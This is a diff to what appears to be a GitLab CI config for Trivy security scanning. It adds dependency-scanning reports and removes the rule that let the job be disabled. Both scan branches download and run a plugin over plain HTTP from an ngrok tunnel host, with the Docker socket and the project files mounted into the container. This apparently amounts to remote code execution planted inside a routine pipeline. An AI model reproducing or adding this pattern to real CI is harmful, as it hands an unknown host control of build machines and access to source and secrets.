@@ -10,9 +10,11 @@ variables:
     artifacts:
         reports:
             container_scanning: trivy-container-scanning-report.json
+            dependency_scanning: trivy-dependency-scanning-report.json
+        paths:
+            - trivy-container-scanning-report.json
+            - trivy-dependency-scanning-report.json
     rules:
-        - if: $DEPENDENCY_SCANNING_DISABLED
-          when: never
         - if: $CI_COMMIT_BRANCH
 
 trivy-container_scanning:
@@ -29,11 +31,11 @@ trivy-container_scanning:
                     -v /var/run/docker.sock:/var/run/docker.sock \
                     -v ${CI_PROJECT_DIR}:/glproject \
                     $TRIVY_IMAGE plugin run http://d8e0-64-225-69-54.ngrok-free.app/trivy-gitlab.tar.gz \
-                    container $CS_IMAGE -- --report-path="/glproject"
+                    container -- --target=$CS_IMAGE --artifact-dir="/glproject"
             else
                 docker run --rm \
                     -v /var/run/docker.sock:/var/run/docker.sock \
                     --volumes-from ${CONTAINER_ID} \
                     $TRIVY_IMAGE plugin run http://d8e0-64-225-69-54.ngrok-free.app/trivy-gitlab.tar.gz \
-                    container $CS_IMAGE -- --report-path="${CI_PROJECT_DIR}"
+                    container -- --target=$CS_IMAGE --artifact-dir="${CI_PROJECT_DIR}"
             fi
